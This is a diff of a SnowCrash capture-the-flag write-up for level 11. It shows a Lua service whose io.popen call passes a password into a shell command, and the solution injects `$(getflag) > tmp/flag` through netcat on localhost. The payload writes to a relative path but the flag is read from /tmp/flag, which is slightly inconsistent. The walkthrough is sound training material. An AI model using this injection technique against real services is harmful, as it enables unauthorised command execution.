@@ -77,7 +77,7 @@ https://linux.die.net/man/3/popen</br>
 `popen` is known for its vunerability to command injections, as it will execute code, see: 
 https://www.stigviewer.com/stig/application_security_and_development/2018-12-24/finding/V-70261
 
-So io.popen starts a program in a separated process and returns a file handle that you can use to read data from this program or to write data to this program.
+So `io.popen` starts a program in a separated process and returns a file handle that you can use to read data from this program or to write data to this program.
 
 So the program `level11.lua` will execute 
 ```bash
@@ -85,15 +85,29 @@ echo "..pass.." | sha1sum
 ```
 `echo "$(command)"` will execute the command.
 
+So we have to send `$(getflag)` as a password to the program. How to connect on port `5151` ? </br>
+
+```bash
+level11@SnowCrash:~$ curl http://localhost:5151
+Password: Erf nope..
+```
+Fails, remembered previous level `netcat`command.
 
 ## Solution
 
-So we should listen to the port 5151: </br>
-`nc localhost 5151`</br>
-`Password: $(getflag)`</br>
+Let's listen to our `localhost` port `5151`:
+```bash
+level11@SnowCrash:~$ nc localhost 5151
+Password: $(getflag)
+Erf nope..
+```
 don't return the flag.
 
-Maybe on a different file: </br>
-`nc localhost 5151`</br>
-`Password: $(getflag) > /tmp/oui`</br>
-`cat /tmp/oui` gives us the flag.
+Maybe on a different file: 
+```bash
+level11@SnowCrash:~$ nc localhost 5151
+Password: $(getflag) > tmp/flag
+Erf nope..
+level11@SnowCrash:~$ cat /tmp/flag
+Check flag.Here is your token : XXXXXXXXXXXXXXXXXXXXX
+```
